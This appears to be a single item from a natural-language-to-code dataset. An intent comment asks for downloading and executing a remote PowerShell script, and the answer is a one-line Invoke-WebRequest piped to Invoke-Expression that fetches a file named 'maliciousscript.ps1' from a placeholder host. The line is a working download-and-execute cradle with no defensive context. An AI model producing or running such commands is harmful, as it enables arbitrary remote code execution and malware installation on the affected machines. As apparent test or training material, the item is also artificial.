# Natural language intent:
# Download and execute a PowerShell script from a remote URL.

Invoke-Expression -Command "& {$url = 'http://website.com/maliciousscript.ps1'; Invoke-WebRequest $url | Invoke-Expression}"
